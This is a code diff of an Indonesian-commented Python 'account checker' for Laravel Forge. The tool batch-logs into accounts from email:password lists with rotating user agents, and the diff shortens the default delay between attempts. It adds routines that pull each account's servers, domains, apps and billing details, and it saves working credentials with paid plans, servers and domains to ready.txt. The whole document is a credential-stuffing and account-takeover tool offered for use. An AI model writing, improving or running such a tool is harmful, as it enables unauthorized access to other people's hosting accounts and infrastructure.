@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-Laravel Forge Auto Login - Subscription Checker (Enhanced)
+Laravel Forge Auto Login - Subscription Checker (Enhanced v2)
 Automatically login to Laravel Forge and check subscription status
 Support untuk multiple credentials dari file dengan rotating user agent dan delay
+Auto-save ke ready.txt jika ada subscription + server + domain
 """
 
 import requests
@@ -10,6 +11,7 @@ import json
 import time
 import random
 import os
+import threading
 from bs4 import BeautifulSoup
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
@@ -34,8 +36,11 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 ]
 
+# Lock untuk file operations
+file_lock = threading.Lock()
+
 class ForgeChecker:
-    def __init__(self, check_delay=10):
+    def __init__(self, check_delay=3):
         self.session = None
         self.base_url = "https://forge.laravel.com"
         self.csrf_token = None
@@ -217,130 +222,237 @@ class ForgeChecker:
             traceback.print_exc()
             return False
     
-    def check_subscription(self):
-        """Check subscription status after login"""
+    def get_servers_data(self):
+        """Get detailed servers data"""
+        servers_data = []
+        
         try:
-            print("\n[→] Fetching subscription & server info...")
-            
-            response = self.session.get(f"{self.base_url}/servers", timeout=10)
-            
-            if response.status_code != 200:
-                print(f"[✗] Failed to access servers page: {response.status_code}")
-                return None
-            
-            soup = BeautifulSoup(response.text, 'html.parser')
-            
-            subscription_info = {
-                "logged_in": True,
-                "url": response.url,
-                "servers": [],
-                "total_servers": 0,
-                "subscription_status": None,
-                "details": {}
-            }
-            
-            print("[→] Parsing server list...")
-            server_cards = soup.find_all(['div', 'li'], class_=lambda x: x and ('server' in x.lower() or 'card' in x.lower()))
-            
-            for card in server_cards:
-                server_name = None
-                name_elem = card.find(['h2', 'h3', 'h4', 'a'], class_=lambda x: x and ('title' in (x or '').lower() or 'name' in (x or '').lower()))
-                if name_elem:
-                    server_name = name_elem.get_text(strip=True)
-                else:
-                    texts = [t.strip() for t in card.get_text(strip=True).split('\n') if t.strip() and len(t.strip()) > 3]
-                    if texts:
-                        server_name = texts[0]
-                
-                if server_name and server_name not in [s['name'] for s in subscription_info["servers"]]:
-                    subscription_info["servers"].append({
-                        "name": server_name,
-                        "type": "server"
-                    })
-            
-            print("[→] Looking for servers in tables...")
-            tables = soup.find_all('table')
-            for table in tables:
-                rows = table.find_all('tr')
-                for row in rows:
-                    cells = row.find_all(['td', 'th'])
-                    if cells and len(cells) > 0:
-                        server_name = cells[0].get_text(strip=True)
-                        if server_name and len(server_name) > 1 and "server" not in server_name.lower():
-                            if server_name not in [s['name'] for s in subscription_info["servers"]]:
-                                subscription_info["servers"].append({
-                                    "name": server_name,
-                                    "type": "table"
-                                })
-            
-            print("[→] Fetching from API...")
+            # Try API endpoint first
             try:
                 api_response = self.session.get(f"{self.base_url}/api/servers", timeout=10)
                 if api_response.status_code == 200:
                     api_data = api_response.json()
                     if isinstance(api_data, dict) and 'data' in api_data:
                         for server in api_data['data']:
-                            server_name = server.get('name', 'Unknown')
-                            if server_name not in [s['name'] for s in subscription_info["servers"]]:
-                                subscription_info["servers"].append({
-                                    "name": server_name,
-                                    "provider": server.get('provider', ''),
-                                    "region": server.get('region', ''),
-                                    "ip": server.get('ip_address', ''),
-                                    "type": "api"
-                                })
+                            servers_data.append({
+                                "name": server.get('name', 'Unknown'),
+                                "provider": server.get('provider', ''),
+                                "region": server.get('region', ''),
+                                "ip": server.get('ip_address', ''),
+                                "size": server.get('size', ''),
+                                "os": server.get('os', ''),
+                                "php_version": server.get('php_version', ''),
+                                "type": "api"
+                            })
                     elif isinstance(api_data, list):
                         for server in api_data:
-                            server_name = server.get('name', 'Unknown')
-                            if server_name not in [s['name'] for s in subscription_info["servers"]]:
-                                subscription_info["servers"].append({
-                                    "name": server_name,
-                                    "provider": server.get('provider', ''),
-                                    "region": server.get('region', ''),
-                                    "ip": server.get('ip_address', ''),
-                                    "type": "api"
-                                })
+                            servers_data.append({
+                                "name": server.get('name', 'Unknown'),
+                                "provider": server.get('provider', ''),
+                                "region": server.get('region', ''),
+                                "ip": server.get('ip_address', ''),
+                                "size": server.get('size', ''),
+                                "os": server.get('os', ''),
+                                "php_version": server.get('php_version', ''),
+                                "type": "api"
+                            })
+                print(f"[✓] Got {len(servers_data)} server(s) from API")
             except:
                 pass
             
-            print("[→] Parsing subscription info...")
+            # If no data from API, try web scraping
+            if not servers_data:
+                response = self.session.get(f"{self.base_url}/servers", timeout=10)
+                if response.status_code == 200:
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    
+                    # Parse dari table atau cards
+                    server_cards = soup.find_all(['div', 'li'], class_=lambda x: x and ('server' in x.lower() or 'card' in x.lower()))
+                    
+                    for card in server_cards:
+                        server_info = {}
+                        texts = [t.strip() for t in card.get_text(strip=True).split('\n') if t.strip()]
+                        if texts:
+                            server_info['name'] = texts[0]
+                            if len(texts) > 1:
+                                server_info['region'] = texts[1] if 'region' not in ' '.join(texts).lower() else ''
+                            server_info['type'] = 'scrape'
+                            servers_data.append(server_info)
             
-            all_text = soup.get_text()
-            
-            for elem in soup.find_all(['div', 'p', 'span', 'h1', 'h2', 'h3']):
-                text = elem.get_text(strip=True)
-                
-                if 'subscription' in text.lower():
-                    subscription_info["details"]["subscription_text"] = text
-                
-                if 'plan' in text.lower() and len(text) < 100:
-                    subscription_info["details"]["plan"] = text
-                
-                if 'active' in text.lower() and len(text) < 100:
-                    subscription_info["details"]["status"] = text
-                
-                if 'pro' in text.lower() or 'business' in text.lower() or 'basic' in text.lower():
-                    if len(text) < 100:
-                        subscription_info["details"]["plan_type"] = text
-            
-            subscription_info["total_servers"] = len(subscription_info["servers"])
-            
-            print("[→] Fetching account details...")
+        except Exception as e:
+            print(f"[!] Error getting servers: {e}")
+        
+        return servers_data
+    
+    def get_domains_data(self):
+        """Get detailed domains data"""
+        domains_data = []
+        
+        try:
+            # Try API endpoint first
             try:
-                profile_response = self.session.get(f"{self.base_url}/account/profile", timeout=10)
-                if profile_response.status_code == 200:
-                    profile_soup = BeautifulSoup(profile_response.text, 'html.parser')
-                    for text_elem in profile_soup.find_all(text=lambda t: t and 'subscription' in t.lower()):
-                        parent = text_elem.parent
-                        if parent:
-                            full_text = parent.get_text(strip=True)
-                            if len(full_text) < 200:
-                                subscription_info["details"]["profile_subscription"] = full_text
+                api_response = self.session.get(f"{self.base_url}/api/domains", timeout=10)
+                if api_response.status_code == 200:
+                    api_data = api_response.json()
+                    if isinstance(api_data, dict) and 'data' in api_data:
+                        for domain in api_data['data']:
+                            domains_data.append({
+                                "domain": domain.get('domain', 'Unknown'),
+                                "server": domain.get('server', ''),
+                                "status": domain.get('status', ''),
+                                "ssl": domain.get('ssl', ''),
+                                "type": "api"
+                            })
+                    elif isinstance(api_data, list):
+                        for domain in api_data:
+                            domains_data.append({
+                                "domain": domain.get('domain', 'Unknown'),
+                                "server": domain.get('server', ''),
+                                "status": domain.get('status', ''),
+                                "ssl": domain.get('ssl', ''),
+                                "type": "api"
+                            })
+                print(f"[✓] Got {len(domains_data)} domain(s) from API")
             except:
                 pass
             
-            print(f"[✓] Found {subscription_info['total_servers']} server(s)")
-            print("[✓] Subscription check completed")
+            # If no data from API, try web scraping
+            if not domains_data:
+                response = self.session.get(f"{self.base_url}/domains", timeout=10)
+                if response.status_code == 200:
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    
+                    # Parse dari table atau cards
+                    domain_cards = soup.find_all(['div', 'li', 'tr'], class_=lambda x: x and ('domain' in (x or '').lower() or 'card' in (x or '').lower()))
+                    
+                    for card in domain_cards:
+                        domain_info = {}
+                        texts = [t.strip() for t in card.get_text(strip=True).split('\n') if t.strip()]
+                        if texts and len(texts) > 0:
+                            domain_info['domain'] = texts[0]
+                            if len(texts) > 1:
+                                domain_info['server'] = texts[1]
+                            domain_info['type'] = 'scrape'
+                            domains_data.append(domain_info)
+            
+        except Exception as e:
+            print(f"[!] Error getting domains: {e}")
+        
+        return domains_data
+    
+    def get_apps_data(self):
+        """Get detailed apps data"""
+        apps_data = []
+        
+        try:
+            # Try API endpoint
+            try:
+                api_response = self.session.get(f"{self.base_url}/api/apps", timeout=10)
+                if api_response.status_code == 200:
+                    api_data = api_response.json()
+                    if isinstance(api_data, dict) and 'data' in api_data:
+                        for app in api_data['data']:
+                            apps_data.append({
+                                "name": app.get('name', 'Unknown'),
+                                "domain": app.get('domain', ''),
+                                "server": app.get('server', ''),
+                                "repository": app.get('repository', ''),
+                                "type": "api"
+                            })
+                    elif isinstance(api_data, list):
+                        for app in api_data:
+                            apps_data.append({
+                                "name": app.get('name', 'Unknown'),
+                                "domain": app.get('domain', ''),
+                                "server": app.get('server', ''),
+                                "repository": app.get('repository', ''),
+                                "type": "api"
+                            })
+                print(f"[✓] Got {len(apps_data)} app(s) from API")
+            except:
+                pass
+        
+        except Exception as e:
+            print(f"[!] Error getting apps: {e}")
+        
+        return apps_data
+    
+    def get_subscription_data(self):
+        """Get detailed subscription data"""
+        subscription_data = {}
+        
+        try:
+            response = self.session.get(f"{self.base_url}/account/billing", timeout=10)
+            if response.status_code == 200:
+                soup = BeautifulSoup(response.text, 'html.parser')
+                
+                # Parse subscription info
+                all_text = soup.get_text()
+                
+                # Cari subscription status
+                for elem in soup.find_all(['div', 'p', 'span', 'h1', 'h2', 'h3', 'li']):
+                    text = elem.get_text(strip=True)
+                    
+                    if 'subscription' in text.lower() and len(text) < 150:
+                        subscription_data['subscription_status'] = text
+                    
+                    if 'plan' in text.lower() and len(text) < 100:
+                        subscription_data['plan'] = text
+                    
+                    if 'active' in text.lower() and len(text) < 100:
+                        subscription_data['status'] = text
+                    
+                    if any(plan in text.lower() for plan in ['pro', 'business', 'basic', 'starter']):
+                        if len(text) < 100:
+                            subscription_data['plan_type'] = text
+                
+                # Try API endpoint
+                try:
+                    api_response = self.session.get(f"{self.base_url}/api/subscription", timeout=10)
+                    if api_response.status_code == 200:
+                        api_data = api_response.json()
+                        subscription_data['api_subscription'] = api_data
+                except:
+                    pass
+                
+                print("[✓] Subscription data retrieved")
+        
+        except Exception as e:
+            print(f"[!] Error getting subscription: {e}")
+        
+        return subscription_data
+    
+    def check_subscription(self):
+        """Check subscription status after login"""
+        try:
+            print("\n[→] Fetching complete subscription & server info...")
+            
+            # Get all data
+            print("[→] Fetching servers...")
+            servers = self.get_servers_data()
+            
+            print("[→] Fetching domains...")
+            domains = self.get_domains_data()
+            
+            print("[→] Fetching apps...")
+            apps = self.get_apps_data()
+            
+            print("[→] Fetching subscription details...")
+            subscription = self.get_subscription_data()
+            
+            subscription_info = {
+                "logged_in": True,
+                "servers": servers,
+                "total_servers": len(servers),
+                "domains": domains,
+                "total_domains": len(domains),
+                "apps": apps,
+                "total_apps": len(apps),
+                "subscription": subscription
+            }
+            
+            print(f"[✓] Found {len(servers)} server(s), {len(domains)} domain(s), {len(apps)} app(s)")
+            print("[✓] Complete data fetch completed")
             return subscription_info
             
         except Exception as e:
@@ -351,9 +463,9 @@ class ForgeChecker:
     
     def check_account(self, email, password, remember=False):
         """Main method: login dan check subscription"""
-        print(f"\n{'=' * 60}")
+        print(f"\n{'=' * 70}")
         print(f"Laravel Forge Account Checker - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-        print(f"{'=' * 60}")
+        print(f"{'=' * 70}")
         
         if not self.login(email, password, remember):
             return {"status": "failed", "message": "Login gagal"}
@@ -372,6 +484,48 @@ class ForgeChecker:
         return result
 
 
+def save_to_ready_file(email, password, data, output_file="ready.txt"):
+    """Save ready credentials to file (thread-safe)"""
+    # Check if has subscription, server, and domain
+    has_subscription = (
+        data.get('subscription') and 
+        data['subscription'].get('subscription')
+    )
+    has_servers = (
+        data.get('subscription') and 
+        data['subscription'].get('total_servers', 0) > 0
+    )
+    has_domains = (
+        data.get('subscription') and 
+        data['subscription'].get('total_domains', 0) > 0
+    )
+    
+    if has_subscription and has_servers and has_domains:
+        with file_lock:
+            try:
+                # Prepare data to save
+                save_data = {
+                    "email": email,
+                    "password": password,
+                    "servers": data['subscription'].get('total_servers', 0),
+                    "domains": data['subscription'].get('total_domains', 0),
+                    "timestamp": datetime.now().isoformat()
+                }
+                
+                # Append to file
+                with open(output_file, 'a') as f:
+                    f.write(json.dumps(save_data) + '\n')
+                
+                print(f"\n[💾] SAVED TO {output_file}: {email}")
+                print(f"     Servers: {save_data['servers']}, Domains: {save_data['domains']}")
+                return True
+            except Exception as e:
+                print(f"[✗] Error saving to file: {e}")
+                return False
+    
+    return False
+
+
 def load_credentials_from_file(file_path):
     """Load credentials dari file dengan format email:password"""
     credentials = []
@@ -385,16 +539,14 @@ def load_credentials_from_file(file_path):
             for line_num, line in enumerate(f, 1):
                 line = line.strip()
                 
-                # Skip empty lines dan comments
                 if not line or line.startswith('#'):
                     continue
                 
-                # Parse email:password
                 if ':' not in line:
                     print(f"[!] Baris {line_num}: Format salah (gunakan email:password) - '{line}'")
                     continue
                 
-                parts = line.split(':', 1)  # Split hanya pada ':' pertama
+                parts = line.split(':', 1)
                 if len(parts) != 2:
                     print(f"[!] Baris {line_num}: Format salah - '{line}'")
                     continue
@@ -434,9 +586,9 @@ def save_results_to_file(results, output_file="forge_results.json"):
 
 def main():
     """Main function"""
-    print("\n" + "=" * 60)
-    print("Laravel Forge Login Checker - Batch Mode")
-    print("=" * 60 + "\n")
+    print("\n" + "=" * 70)
+    print("Laravel Forge Login Checker - Batch Mode (Enhanced v2)")
+    print("=" * 70 + "\n")
     
     while True:
         print("[1] Load credentials dari file")
@@ -464,10 +616,10 @@ def main():
             
             # Input delay
             try:
-                delay_input = input("⏱️  Delay antar pengecekan (detik, default: 10): ").strip()
-                check_delay = int(delay_input) if delay_input else 10
+                delay_input = input("⏱️  Delay antar pengecekan (detik, default: 3): ").strip()
+                check_delay = int(delay_input) if delay_input else 3
             except ValueError:
-                check_delay = 10
+                check_delay = 3
                 print(f"[!] Delay invalid, menggunakan default: {check_delay} detik")
             
             # Ask to enable remember
@@ -483,9 +635,9 @@ def main():
             results = []
             
             for idx, cred in enumerate(credentials, 1):
-                print(f"\n{'=' * 60}")
+                print(f"\n{'=' * 70}")
                 print(f"Checking Account {idx}/{len(credentials)}")
-                print(f"{'=' * 60}")
+                print(f"{'=' * 70}")
                 
                 result = checker.check_account(
                     email=cred['email'],
@@ -495,10 +647,14 @@ def main():
                 
                 results.append(result)
                 
-                print("\n" + "-" * 60)
+                print("\n" + "-" * 70)
                 print("HASIL:")
-                print(json.dumps(result, indent=2, ensure_ascii=False))
-                print("-" * 60)
+                print(json.dumps(result, indent=2, ensure_ascii=False)[:500])
+                print("-" * 70)
+                
+                # Auto-save to ready.txt if has subscription, servers, and domains
+                if result['status'] == 'success':
+                    save_to_ready_file(cred['email'], cred['password'], result, "ready.txt")
                 
                 # Delay sebelum pengecekan berikutnya
                 if idx < len(credentials):
@@ -506,12 +662,12 @@ def main():
                     for i in range(check_delay, 0, -1):
                         print(f"[⏳] {i} seconds remaining...", end='\r')
                         time.sleep(1)
-                    print(" " * 40, end='\r')  # Clear line
+                    print(" " * 40, end='\r')
             
             # Save results
-            print(f"\n{'=' * 60}")
+            print(f"\n{'=' * 70}")
             print("BATCH CHECK COMPLETED")
-            print(f"{'=' * 60}")
+            print(f"{'=' * 70}")
             
             summary = {
                 "total_accounts": len(credentials),
@@ -521,9 +677,9 @@ def main():
                 "results": results
             }
             
-            print(json.dumps(summary, indent=2, ensure_ascii=False))
+            print(json.dumps(summary, indent=2, ensure_ascii=False)[:1000])
             
-            save_option = input("\n💾 Simpan hasil? (y/n): ").strip().lower()
+            save_option = input("\n💾 Simpan hasil detail? (y/n): ").strip().lower()
             if save_option == 'y':
                 output_file = input("📁 Nama file output (default: forge_results.json): ").strip()
                 if not output_file:
@@ -553,10 +709,14 @@ def main():
                     remember=remember
                 )
                 
-                print("\n" + "=" * 60)
+                print("\n" + "=" * 70)
                 print("HASIL:")
-                print(json.dumps(result, indent=2, ensure_ascii=False))
-                print("=" * 60 + "\n")
+                print(json.dumps(result, indent=2, ensure_ascii=False)[:1000])
+                print("=" * 70 + "\n")
+                
+                # Auto-save to ready.txt if valid
+                if result['status'] == 'success':
+                    save_to_ready_file(email, password, result, "ready.txt")
                 
                 lagi = input("Cek akun lain? (y/n): ").strip().lower()
                 if lagi != 'y':
